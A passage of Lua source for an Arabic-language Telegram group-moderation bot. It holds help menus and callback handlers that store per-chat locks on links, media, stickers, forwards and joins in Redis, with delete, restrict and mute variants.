٠ لعبة المعاني ٠ معاني
٠ لعبة الترجمه ٠ انجليزي
٠ لعبة البات ٠ بات
٠ لعبة التخمين ٠ خمن
٠ لعبة الاسرع ٠ الاسرع
٠ لعبة السمايلات ٠ سمايلات
٠ لعبة الاسئلة ٠ كت تويت
٠ لعبة الاعلام والدول ٠ اعلام
٠ لعبة لو خيروك ٠ خيروك
٠ لعبة الصراحه والجرأة ٠ صراحه
٠ لعبه باد للأسئله +18 ٠ باد
٠ لعبه جريمتي ويقوم البوت بإعطائك جريمه ٠ جريمتي
– – – – – – – –
٠ نقاطي ٠ لعرض عدد الارباح
٠ بيع نقاطي ٠ { العدد } ٠ لبيع كل نقطه مقابل {50} رساله
*]]
edit(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/helpall') then
local UserId = Text:match('(%d+)/helpall')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '１', data = IdUser..'/help1'}, {text = '２', data = IdUser..'/help2'}, 
},
{
{text = '３', data = IdUser..'/help3'}, {text = '４', data = IdUser..'/help4'}, 
},
{
{text = '５', data = IdUser..'/help5'}, {text = '６', data = IdUser..'/help7'}, 
},
{
{text = 'الالعاب', data = IdUser..'/help6'},
},
{
{text = 'اوامر القفل', data = IdUser..'/NoNextSeting'}, {text = 'اوامر التعطيل', data = IdUser..'/listallAddorrem'}, 
},
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
local TextHelp = [[*
٠ توجد ٠ 6 اوامر في البوت
– – – – – – – –
٠ 1 ٠ اوامر الحمايه
٠ 2 ٠ اوامر الادمنيه
٠ 3 ٠ اوامر المدراء
٠ 4 ٠ اوامر المنشئين
٠ 5 ٠ اوامر مطورين البوت
٠ 6 ٠ اوامر التسلية البوت
*]]
edit(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/lock_link') then
local UserId = Text:match('(%d+)/lock_link')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Link"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الروابط").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_spam') then
local UserId = Text:match('(%d+)/lock_spam')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Spam"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الكلايش").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_keypord') then
local UserId = Text:match('(%d+)/lock_keypord')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Keyboard"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الكيبورد").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_voice') then
local UserId = Text:match('(%d+)/lock_voice')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:vico"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الاغاني").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_gif') then
local UserId = Text:match('(%d+)/lock_gif')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Animation"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل المتحركات").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_files') then
local UserId = Text:match('(%d+)/lock_files')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Document"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الملفات").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_text') then
local UserId = Text:match('(%d+)/lock_text')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:text"..ChatId,true) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الدردشه").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_video') then
local UserId = Text:match('(%d+)/lock_video')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Video"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الفيديو").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_photo') then
local UserId = Text:match('(%d+)/lock_photo')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Photo"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الصور").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_username') then
local UserId = Text:match('(%d+)/lock_username')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:User:Name"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل المعرفات").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_tags') then
local UserId = Text:match('(%d+)/lock_tags')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:hashtak"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل التاك").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_bots') then
local UserId = Text:match('(%d+)/lock_bots')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Bot:kick"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل البوتات").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_fwd') then
local UserId = Text:match('(%d+)/lock_fwd')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:forward"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل التوجيه").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_audio') then
local UserId = Text:match('(%d+)/lock_audio')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Audio"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الصوت").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_stikear') then
local UserId = Text:match('(%d+)/lock_stikear')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Sticker"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الملصقات").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_phone') then
local UserId = Text:match('(%d+)/lock_phone')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Contact"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الجهات").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_joine') then
local UserId = Text:match('(%d+)/lock_joine')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Join"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الدخول").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_addmem') then
local UserId = Text:match('(%d+)/lock_addmem')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:AddMempar"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الاضافه").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_videonote') then
local UserId = Text:match('(%d+)/lock_videonote')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Unsupported"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل بصمه الفيديو").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_pin') then
local UserId = Text:match('(%d+)/lock_pin')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."lockpin"..ChatId,(LuaTele.getChatPinnedMessage(ChatId).id or true)) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل التثبيت").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_tgservir') then
local UserId = Text:match('(%d+)/lock_tgservir')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:tagservr"..ChatId,true)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الاشعارات").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_markdaun') then
local UserId = Text:match('(%d+)/lock_markdaun')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Markdaun"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الماركدون").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_edits') then
local UserId = Text:match('(%d+)/lock_edits')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:edit"..ChatId,true) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل التعديل").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_games') then
local UserId = Text:match('(%d+)/lock_games')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:geam"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الالعاب").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_flood') then
local UserId = Text:match('(%d+)/lock_flood')
if tonumber(IdUser) == tonumber(UserId) then
Redis:hset(darket.."Spam:Group:User"..ChatId ,"Spam:User","del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل التكرار").Lock, 'md', true, false, reply_markup)
end
end

if Text and Text:match('(%d+)/lock_linkkid') then
local UserId = Text:match('(%d+)/lock_linkkid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Link"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الروابط").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_spamkid') then
local UserId = Text:match('(%d+)/lock_spamkid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Spam"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الكلايش").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_keypordkid') then
local UserId = Text:match('(%d+)/lock_keypordkid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Keyboard"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الكيبورد").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_voicekid') then
local UserId = Text:match('(%d+)/lock_voicekid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:vico"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الاغاني").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_gifkid') then
local UserId = Text:match('(%d+)/lock_gifkid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Animation"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل المتحركات").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_fileskid') then
local UserId = Text:match('(%d+)/lock_fileskid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Document"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الملفات").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_videokid') then
local UserId = Text:match('(%d+)/lock_videokid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Video"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الفيديو").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_photokid') then
local UserId = Text:match('(%d+)/lock_photokid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Photo"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الصور").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_usernamekid') then
local UserId = Text:match('(%d+)/lock_usernamekid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:User:Name"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل المعرفات").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_tagskid') then
local UserId = Text:match('(%d+)/lock_tagskid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:hashtak"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل التاك").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_fwdkid') then
local UserId = Text:match('(%d+)/lock_fwdkid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:forward"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل التوجيه").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_audiokid') then
local UserId = Text:match('(%d+)/lock_audiokid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Audio"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الصوت").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_stikearkid') then
local UserId = Text:match('(%d+)/lock_stikearkid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Sticker"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الملصقات").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_phonekid') then
local UserId = Text:match('(%d+)/lock_phonekid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Contact"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الجهات").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_videonotekid') then
local UserId = Text:match('(%d+)/lock_videonotekid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Unsupported"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل بصمه الفيديو").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_markdaunkid') then
local UserId = Text:match('(%d+)/lock_markdaunkid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Markdaun"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الماركدون").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_gameskid') then
local UserId = Text:match('(%d+)/lock_gameskid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:geam"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الالعاب").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_floodkid') then
local UserId = Text:match('(%d+)/lock_floodkid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:hset(darket.."Spam:Group:User"..ChatId ,"Spam:User","keed")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل التكرار").lockKid, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/lock_linkktm') then
local UserId = Text:match('(%d+)/lock_linkktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Link"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الروابط").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_spamktm') then
local UserId = Text:match('(%d+)/lock_spamktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Spam"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الكلايش").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_keypordktm') then
local UserId = Text:match('(%d+)/lock_keypordktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Keyboard"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الكيبورد").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_voicektm') then
local UserId = Text:match('(%d+)/lock_voicektm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:vico"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الاغاني").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_gifktm') then
local UserId = Text:match('(%d+)/lock_gifktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Animation"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل المتحركات").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_filesktm') then
local UserId = Text:match('(%d+)/lock_filesktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Document"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الملفات").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_videoktm') then
local UserId = Text:match('(%d+)/lock_videoktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Video"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الفيديو").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_photoktm') then
local UserId = Text:match('(%d+)/lock_photoktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Photo"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الصور").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_usernamektm') then
local UserId = Text:match('(%d+)/lock_usernamektm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:User:Name"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل المعرفات").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_tagsktm') then
local UserId = Text:match('(%d+)/lock_tagsktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:hashtak"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل التاك").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_fwdktm') then
local UserId = Text:match('(%d+)/lock_fwdktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:forward"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل التوجيه").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_audioktm') then
local UserId = Text:match('(%d+)/lock_audioktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Audio"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الصوت").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_stikearktm') then
local UserId = Text:match('(%d+)/lock_stikearktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Sticker"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الملصقات").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_phonektm') then
local UserId = Text:match('(%d+)/lock_phonektm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Contact"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الجهات").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_videonotektm') then
local UserId = Text:match('(%d+)/lock_videonotektm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Unsupported"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل بصمه الفيديو").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_markdaunktm') then
local UserId = Text:match('(%d+)/lock_markdaunktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:Markdaun"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
edit(ChatId,Msg_id,Reply_Status(IdUser,"٠ تم قفـل الماركدون").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_gamesktm') then
local UserId = Text:match('(%d+)/lock_gamesktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(darket.."Lock:geam"..ChatId,"ktm")  
